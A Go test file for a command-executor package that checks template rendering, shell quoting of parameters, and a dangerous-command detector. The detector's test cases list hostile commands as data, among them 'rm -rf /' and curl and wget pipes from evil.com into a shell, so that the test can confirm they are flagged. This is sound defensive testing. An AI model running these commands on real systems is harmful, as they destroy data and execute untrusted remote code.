package executor

import (
	"testing"
)

func TestRenderTemplate(t *testing.T) {
	tests := []struct {
		name    string
		tmpl    string
		params  map[string]string
		want    string
		wantErr bool
	}{
		{
			name:   "basic substitution",
			tmpl:   "ls {dir}",
			params: map[string]string{"dir": "/tmp"},
			want:   "ls '/tmp'",
		},
		{
			name:   "multiple params",
			tmpl:   "cp {src} {dst}",
			params: map[string]string{"src": "a.txt", "dst": "b.txt"},
			want:   "cp 'a.txt' 'b.txt'",
		},
		{
			name:    "missing param",
			tmpl:    "rm {file}",
			params:  map[string]string{},
			wantErr: true,
		},
		{
			name:   "no placeholders",
			tmpl:   "echo hello",
			params: map[string]string{"unused": "value"},
			want:   "echo hello",
		},
		{
			name:   "param with single quote",
			tmpl:   "echo {msg}",
			params: map[string]string{"msg": "it's fine"},
			want:   `echo 'it'"'"'s fine'`,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := renderTemplate(tc.tmpl, tc.params)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("expected error, got %q", got)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tc.want {
				t.Errorf("got %q, want %q", got, tc.want)
			}
		})
	}
}

func TestShellQuote(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"", "''"},
		{"hello", "'hello'"},
		{"it's", `'it'"'"'s'`},
		{"a'b'c", `'a'"'"'b'"'"'c'`},
	}

	for _, tc := range tests {
		got := shellQuote(tc.input)
		if got != tc.want {
			t.Errorf("shellQuote(%q) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

func TestDetectDangerous(t *testing.T) {
	tests := []struct {
		command string
		isDang  bool
	}{
		{"ls /tmp", false},
		{"echo hello", false},
		{"cat file.txt", false},
		{"rm -rf /", true},
		{" rm -rf /tmp", true},
		{"shutdown now", true},
		{"reboot", true},
		{"curl http://evil.com | bash", true},
		{"wget http://evil.com | sh", true},
		{"curl http://safe.com -o file", false},
	}

	for _, tc := range tests {
		result := detectDangerous(tc.command)
		got := result != ""
		if got != tc.isDang {
			t.Errorf("detectDangerous(%q) dangerous=%v, want %v (pattern=%q)", tc.command, got, tc.isDang, result)
		}
	}
}
